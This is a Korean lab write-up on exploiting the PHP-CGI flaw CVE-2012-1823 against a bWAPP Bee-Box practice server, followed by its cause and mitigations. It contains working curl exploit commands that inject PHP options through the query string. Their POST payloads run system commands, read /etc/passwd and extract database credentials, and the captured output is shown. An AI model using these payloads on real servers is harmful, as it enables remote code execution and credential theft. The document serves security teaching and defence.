# 웹 해킹 실습 교육: PHP CGI Remote Code Execution 

> **교육 목적 전용 (For Educational Purposes Only)**  
> 본 문서는 bWAPP(Bee-Box) 취약점 실습 환경을 대상으로 작성되었습니다.  
> 허가 없이 타인의 시스템에 적용하는 것은 불법입니다.

---

## 📋 실습 환경 정보

| 항목 | 내용 |
|------|------|
| **대상 서버** | `192.168.0.20` (bWAPP Bee-Box) |
| **공격자 서버** | `192.168.0.146` (Kali Linux) |
| **취약점 안내 페이지**| `http://192.168.0.20/bWAPP/php_cgi.php` |
| **실제 취약점 대상** | `http://192.168.0.20/bWAPP/admin/phpinfo.php` |
| **계정 정보** | `bee / bug` |
| **보안 레벨** | Low (Security Level: 0) |
| **실습 일시** | 2026-04-20 |

---

## 🎯 취약점 개요

### PHP CGI 원격 코드 실행 (CVE-2012-1823)

과거 PHP 설정 중 특정 조건 버그로 인해, **CGI 모드로 동작하는 PHP 환경**에서 쿼리스트링(Query String)이 PHP 인터프리터의 커맨드라인 옵션으로 전달되는 심각한 취약점이 발견되었습니다. 

공격자는 쿼리스트링에 `-d` 옵션을 전달하여 PHP 설정 값을 강제로 덮어씌울 수 있습니다. 이를 통해 원격으로 PHP 코드를 실행하여(RCE, Remote Code Execution) 서버 제어를 탈취할 수 있습니다.

**주요 공격 메커니즘:**
1. `allow_url_include=1` 옵션 활성화: 외부 입력을 소스 코드로 포함시킬 수 있게 만듭니다.
2. `auto_prepend_file=php://input` 옵션 설정: HTTP POST 요청 본문(body)을 스크립트 실행 전에 가장 먼저 불러와(include) 실행하게 합니다.

### OWASP Top 10 분류
- **A03:2021** – Injection 
- **A06:2021** – Vulnerable and Outdated Components

---

## 🔍 공격 흐름 다이어그램

```
[공격자 (Kali Linux)]
        │
        ▼
[1단계] 취약점 페이지 탐색 및 정보 확인
        (bWAPP/php_cgi.php)
        │
        ▼
[2단계] 실제 CGI 방식으로 구동되는 페이지 확인
        (admin/phpinfo.php)
        │
        ▼
[3단계] 쿼리스트링(-d 옵션)을 통한 PHP 환경변수 조작
        (? -d allow_url_include=1 -d auto_prepend_file=php://input)
        │
        ▼
[4단계] POST Body에 악성 PHP 코드 삽입 후 전송
        (<?php system('id'); die(); ?>)
        │
        ▼
[5단계] 원격 코드 실행(RCE) 및 시스템/DB 권한 탈취
```

---

## 🛠️ 단계별 실습 (실제 실행 명령어)

### Step 1: 취약점 확인 (CGI 모드 안내)

```bash
# 취약점 안내 페이지 소스 확인
curl -s \
     -b /home/kali/docker_exam/bwapp_cookie.txt \
     "http://192.168.0.20/bWAPP/php_cgi.php" | grep admin
```

**페이지 분석 결과:**
```html
<p>The <a href="./admin/phpinfo.php" target="_blank">admin</a> directory is using PHP in CGI mode. (<a href="http://sourceforge.net/projects/bwapp/files/bee-box/" target="_blank">bee-box</a> only)</p>
```

> 💡 **포인트**: 서버 환경에서 특정 디렉토리(`admin/`)의 `phpinfo.php` 스크립트가 CGI 모드로 처리되고 있음을 의미합니다. 취약점의 실질적 공격 타겟은 여기입니다!

---

### Step 2: 원격 코드 실행 (RCE) 공격 시도

```bash
# curl을 활용한 RCE (Remote Code Execution) 시도
curl -s \
  -b /home/kali/docker_exam/bwapp_cookie.txt \
  "http://192.168.0.20/bWAPP/admin/phpinfo.php?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input" \
  -d "<?php system('id'); die(); ?>"
```

**실행 결과:**
```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

> 🚨 **핵심 취약점 발생 지점**:
> - `-d allow_url_include=1` : URL의 내용을 include 하도록 허용.
> - `-d auto_prepend_file=php://input` : POST 본문으로 넘긴 데이터를 최우선적으로 호출.
> - POST Body : `<?php system('id'); die(); ?>` (명령어 실행 후 이후 정상 스크립트 실행 전에 바로 종료)

---

### Step 3: 고급 시스템 정보 탈취 (Post-Exploitation)

RCE가 가능해졌으므로, 실제 탈취에 필요한 여러 명령어를 복합하여 전달할 수 있습니다.

```bash
# 통합된 정보 탈취용 공격 쿼리 
curl -s \
  -b /home/kali/docker_exam/bwapp_cookie.txt \
  "http://192.168.0.20/bWAPP/admin/phpinfo.php?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input" \
  -d "<?php 
echo '=== System Info ===\n'; 
system('uname -a; id; hostname;'); 
echo '\n=== /etc/passwd ===\n'; 
system('cat /etc/passwd | head -n 5'); 
echo '\n=== Admin Config ===\n'; 
system('cat /var/www/bWAPP/admin/settings.php | grep -E \"db_server|db_username|db_password\"'); 
die(); 
?>"
```

**실행 결과 (탈취된 주요 정보):**
```text
=== System Info ===
Linux bee-box 2.6.24-16-generic #1 SMP Thu Apr 10 13:23:42 UTC 2008 i686 GNU/Linux
uid=33(www-data) gid=33(www-data) groups=33(www-data)
bee-box

=== /etc/passwd ===
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync

=== Admin Config ===
$db_server = "localhost";
$db_username = "root";
$db_password = "bug";
```

---

## 📊 탈취 정보 요약

| 수집 정보 | 내용 |
|-----------|------|
| **OS/커널** | `Linux bee-box 2.6.24-16-generic (Ubuntu 8.04)` |
| **웹 프로세스** | `www-data (uid=33)` |
| **서버 호스트명** | `bee-box` |
| **탈취된 DB 접속 정보** | `root / bug` (DBMS 루트 계정 완전히 노출) |

---

## 🛡️ 취약점 발생 원인 및 대응 방안

### 버그 원인 (CVE-2012-1823)

CGI(Common Gateway Interface) 기반으로 동작하는 `php-cgi`가 사용자로부터 넘어오는 쿼리스트링(인자)을 처리할 때 적절한 이스케이프(Escape) 처리가 누락되었습니다. 따라서 사용자가 웹 URL 요청에 커맨드라인 매개변수(`-d`, `-s` 등)를 주입할 수 있었습니다. 특히 `-d` 옵션은 `php.ini`의 환경변수 지시자를 동적으로 재정의할 수 있는 강력한 옵션입니다.

### 방어 대응책 (Mitigation)

1. **PHP 및 OS 업데이트 (가장 중요)**
   - 이 취약점은 해당 보안 결함이 패치된 최신 버전의 PHP(예: 5.3.12/5.4.2 이상)로 업그레이드만 하면 해결됩니다. 

2. **CGI 대신 PHP-FPM / Mod_PHP 활용 권장**
   - 가급적 낡고 보안적 결함이 많았던 Native CGI 방식보단, 더 안전하고 효율적인 FastCGI(PHP-FPM) 모듈 또는 Apache `mod_php` 방식으로 서버를 운영합니다.

3. **WAF(웹 방화벽) 및 IPS 도입**
   - 쿼리스트링에 `-d allow_url_include=`, `auto_prepend_file=php://` 와 같은 비정상적인 형태의 공격 시그니처가 유입되는 것을 즉각 차단할 수 있습니다.

---

## 📚 추가 학습 자료

- [CVE-2012-1823 취약점 정보 (NVD)](https://nvd.nist.gov/vuln/detail/CVE-2012-1823)
- [OWASP - Command Injection](https://owasp.org/www-community/attacks/Command_Injection)

---

## ⚖️ 법적 고지

> 이 문서의 모든 기법은 **bWAPP(Bee-Box)** 의도적 취약 환경에서  
> **교육 목적**으로만 수행되었습니다.  
> 허가받지 않은 환경에 해당 기술을 활용할 경우 **심각한 불법 행위**로 간주됩니다.
> 반드시 본인 소유 또는 적법한 동의를 얻은 환경 내에서 활용하십시오.

---

*작성일: 2026-04-20 | 실습 환경: Kali Linux + bWAPP Bee-Box | 작성: ngnicky-ai*
